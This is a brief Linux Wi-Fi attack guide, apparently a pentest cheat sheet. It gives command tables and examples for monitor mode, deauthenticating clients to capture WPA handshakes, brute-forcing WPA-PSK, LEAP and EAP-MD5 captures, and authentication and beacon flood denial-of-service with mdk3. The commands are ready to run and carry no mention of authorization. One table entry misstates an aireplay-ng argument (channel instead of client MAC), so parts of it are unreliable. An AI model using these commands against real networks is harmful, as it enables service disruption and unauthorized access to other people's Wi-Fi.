### Wi-Fi Network Testing in Linux

Testing Wi-Fi networks in Linux involves a series of commands to place wireless interfaces into monitor mode, capture handshakes, perform brute force attacks, and conduct denial-of-service (DoS) attacks. This guide provides a structured approach to these tasks using common tools such as `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, `mdk3`, and others.
#### Setting Up Monitor Mode
To begin testing, you need to place your wireless interface into monitor mode. This allows you to capture all wireless traffic in your vicinity.

|Command|Description|
|---|---|
|`airmon-ng stop ath0`|Stop any processes on `ath0` to prepare for monitor mode|
|`airmon-ng start wifi0`|Start monitor mode on `wifi0` interface|
|`iwconfig ath0 channel $CH`|Set the channel on `ath0` to channel `$CH`|

**Example:**
```
airmon-ng stop ath0
airmon-ng start wifi0
iwconfig ath0 channel 6
```
#### Capturing Client Handshake
Capturing the WPA/WPA2 handshake is crucial for performing brute force attacks.

|Command|Description|
|---|---|
|`airodump-ng -c $CH --bssid $AP -w file ath0`|Capture traffic on channel `$CH` from access point `$AP` and save to `file`|
|`aireplay-ng -0 10 -a $AP -c $CH ath0`|Send 10 de-authentication packets to force clients to reconnect, capturing the handshake|

**Example:**
```
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture ath0
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 00:22:33:44:55:66 ath0
```
#### Brute Force Handshake Attack
Once the handshake is captured, a brute force attack can be attempted to find the WPA-PSK.

|Command|Description|
|---|---|
|`aircrack-ng -w wordlist capture.cap`|Brute force WPA-PSK using `wordlist` against `capture.cap`|
|`asleap -r capture.cap -w dict.asleap`|Brute force LEAP using `dict.asleap` against `capture.cap`|
|`eapmd5pass -r capture.cap -w wordlist`|Brute force EAP-MD5 using `wordlist` against `capture.cap`|

**Example:**
```
aircrack-ng -w wordlist.txt capture.cap
asleap -r capture.cap -w dict.asleap
eapmd5pass -r capture.cap -w wordlist.txt
```
#### Denial of Service (DoS) Attack
Performing a DoS attack can flood the network with various types of packets, disrupting service.

|Command|Description|
|---|---|
|`mdk3 int a -a $AP`|Authentication flood on `$AP`|
|`mdk3 int b -c $CH`|Beacon flood on channel `$CH`|
